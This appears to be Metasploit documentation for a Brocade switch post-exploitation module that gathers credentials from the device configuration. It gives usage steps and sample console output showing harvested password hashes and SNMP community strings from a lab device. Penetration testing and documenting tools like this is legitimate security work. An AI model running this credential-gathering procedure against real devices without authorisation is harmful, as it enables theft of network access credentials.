## Vulnerable Application

  This module has been tested on the following hardware/OS combinations.

  * Brocade ICX 6430-24
    * Firmware: 08.0.20T311

  The ICX config can be found [no passwords](https://github.com/h00die/MSF-Testing-Scripts/blob/master/brocade_icx6430_nopass.conf), 
  [hashes](https://github.com/h00die/MSF-Testing-Scripts/blob/master/brocade_icx6430_pass.conf)

  This module will look for the follow parameters which contain credentials:

  * FastIron
    * `show configuration`

!!! keep in mind 'password-display' http://wwwaem.brocade.com/content/html/en/command-reference-guide/fastiron-08040-commandref/GUID-169889CD-1A74-4A23-AC78-38796692374F.html
!!! need to be able to give a password to enable

    * super-user-password
    * username
    * SNMP

## Verification Steps

  1. Start msfconsole
  2. Get a shell
  3. Do: ```use post/brocade/gather/enum_brocade```
  4. Do: ```set session [id]```
  5. Do: ```set verbose true```
  6. Do: ```run```

## Scenarios

### ICX 6430-24, FastIron 08.0.20T311

#### SSH Session with password-display off

```
resource (brocade.rb)> use post/brocade/gather/enum_brocade
resource (brocade.rb)> set session 1
session => 1
resource (brocade.rb)> set verbose true
verbose => true
resource (brocade.rb)> run
[*] In a non-enabled cli
[*] Getting version information
[*] OS: 08.0.30hT311
[+] Version information stored in to loot /root/.msf4/loot/20190601203656_default_10.0.4.51_brocade.version_751557.txt
[*] Gathering info from show configuration
[!] password-display is disabled, no password hashes displayed in config
[*] Post module execution completed
```

#### SSH Session with Enable run 

```
resource (brocade.rb)> use post/brocade/gather/enum_brocade
resource (brocade.rb)> set session 1
session => 1
resource (brocade.rb)> set verbose true
verbose => true
[*] In an enabled cli
[*] Getting version information
[*] OS: 08.0.30hT311
[+] Version information stored in to loot /root/.msf4/loot/20190601221921_default_10.0.4.51_brocade.version_839783.txt
[*] Gathering info from show configuration
[+] password-display is enabled, hashes will be displayed in config
[+] enable password hash $1$QP3H93Wm$uxYAs2HmAK0lQiP3ig5tm.
[+] User brocade of type 8 found with password hash $1$f/uxhovU$dST5lNskZCPQe/5QijULi0.
[+] ENCRYPTED SNMP community $MlVzZCFAbg== with permissions ro
[+] ENCRYPTED SNMP community $U2kyXj1k with permissions rw
[*] Post module execution completed
msf5 post(brocade/gather/enum_brocade) > loot

Loot
====

host       service  type             name         content     info                   path
----       -------  ----             ----         -------     ----                   ----
10.0.4.51           brocade.version  version.txt  text/plain  Brocade Version        /root/.msf4/loot/20190601221959_default_10.0.4.51_brocade.version_003751.txt
10.0.4.51           brocade.config   config.txt   text/plain  Brocade Configuration  /root/.msf4/loot/20190601222004_default_10.0.4.51_brocade.config_998514.txt

msf5 post(brocade/gather/enum_brocade) > creds
Credentials
===========

host       origin     service         public   private                             realm  private_type
----       ------     -------         ------   -------                             -----  ------------
10.0.4.51  10.0.4.51  22/tcp          enable   $1$QP3H93Wm$uxYAs2HmAK0lQiP3ig5tm.         Nonreplayable hash
10.0.4.51  10.0.4.51  161/udp (snmp)           $MlVzZCFAbg==                              Nonreplayable hash
10.0.4.51  10.0.4.51  161/udp (snmp)           $U2kyXj1k                                  Nonreplayable hash
10.0.4.51  10.0.4.51  22/tcp          brocade  $1$f/uxhovU$dST5lNskZCPQe/5QijULi0         Nonreplayable hash
```
